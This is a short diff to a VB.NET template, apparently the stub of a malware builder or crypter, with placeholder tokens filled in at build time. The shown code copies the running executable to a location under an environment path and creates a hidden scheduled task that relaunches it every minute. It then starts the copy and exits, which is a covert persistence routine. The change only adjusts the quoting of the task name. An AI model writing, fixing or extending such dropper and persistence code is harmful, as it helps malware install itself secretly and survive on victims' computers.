@@ -77,7 +77,7 @@ Public Class %Class1%
 '%Drop%   Dim %STUP% As String = Interaction.Environ("%PATH%") + "\" + "%EXE%"
 '%Drop%   If Application.ExecutablePath <> %STUP% Then
 '%Drop%   IO.File.Copy(Application.ExecutablePath, %STUP%, True)
-'%Drop%   Shell("schtasks /create /f /sc minute /mo 1 /tn " & IO.Path.GetFileNameWithoutExtension(Application.ExecutablePath) & " /tr " + """'" & %STUP% & "'""", AppWinStyle.Hide, False, -1)
+'%Drop%   Shell("schtasks /create /f /sc minute /mo 1 /tn " + """'" & IO.Path.GetFileNameWithoutExtension(Application.ExecutablePath) & "'""" + " /tr " + """'" & %STUP% & "'""", AppWinStyle.Hide, False, -1)
 '%Drop%   Process.Start(%STUP%)
 '%Drop%   End
 '%Drop%   End If
